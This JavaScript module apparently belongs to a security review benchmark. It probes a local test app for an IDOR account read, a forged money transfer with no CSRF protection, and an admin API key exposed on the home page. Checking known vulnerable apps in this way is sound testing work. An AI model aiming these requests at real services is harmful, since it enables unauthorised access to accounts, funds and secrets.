const axios = require('axios');

function truncate(value) {
  const s = typeof value === 'string' ? value : JSON.stringify(value);
  return s.length > 200 ? s.slice(0, 199) + '…' : s;
}

async function checkIdor(baseUrl) {
  const res = await axios.get(`${baseUrl}/account/user-2`, {
    headers: { 'X-User-Id': 'user-1' },
    timeout: 5000,
    validateStatus: () => true,
  });
  return {
    exploited:
      res.status === 200 &&
      res.data &&
      (res.data.id === 'user-2' || Object.prototype.hasOwnProperty.call(res.data, 'secretNote')),
    summary: `IDOR: ${res.status} ${truncate(res.data)}`,
  };
}

async function checkCsrf(baseUrl) {
  try {
    await axios.post(`${baseUrl}/reset`, {}, { timeout: 2000 });
  } catch {}
  const res = await axios.post(
    `${baseUrl}/transfer`,
    { to: 'user-2', amount: 1000 },
    {
      headers: { 'Content-Type': 'application/json' },
      timeout: 5000,
      validateStatus: () => true,
    },
  );
  return {
    exploited: res.status === 200 && res.data && res.data.success === true,
    summary: `CSRF transfer: ${res.status} ${truncate(res.data)}`,
  };
}

async function checkSecretExposure(baseUrl) {
  const res = await axios.get(`${baseUrl}/`, {
    timeout: 5000,
    responseType: 'text',
    transformResponse: [(d) => d],
    validateStatus: () => true,
  });
  const body = typeof res.data === 'string' ? res.data : String(res.data);
  return {
    exploited: res.status === 200 && (/sk-review-admin/i.test(body) || /ADMIN_API_KEY/.test(body)),
    summary: `Secret exposure: ${res.status} ${/sk-review-admin|ADMIN_API_KEY/.test(body) ? 'key marker visible' : 'no key marker'}`,
  };
}

async function runAccountWorkflowReviewAttack({ baseUrl }) {
  const start = Date.now();
  const checks = [];

  try {
    checks.push(['idor', await checkIdor(baseUrl)]);
    checks.push(['csrf', await checkCsrf(baseUrl)]);
    checks.push(['secret-exposure', await checkSecretExposure(baseUrl)]);

    const hit = checks.find(([, result]) => result.exploited);
    return {
      vulnerability: 'review-account-workflow',
      exploited: Boolean(hit),
      payload: hit ? hit[0] : null,
      evidence: truncate(checks.map(([name, result]) => `${name}: ${result.summary}`).join('; ')),
      durationMs: Date.now() - start,
    };
  } catch (err) {
    return {
      vulnerability: 'review-account-workflow',
      exploited: false,
      payload: null,
      evidence: truncate(`Review attack failed: ${err.message}`),
      durationMs: Date.now() - start,
    };
  } finally {
    try {
      await axios.post(`${baseUrl}/reset`, {}, { timeout: 2000 });
    } catch {}
  }
}

module.exports = { runAccountWorkflowReviewAttack };
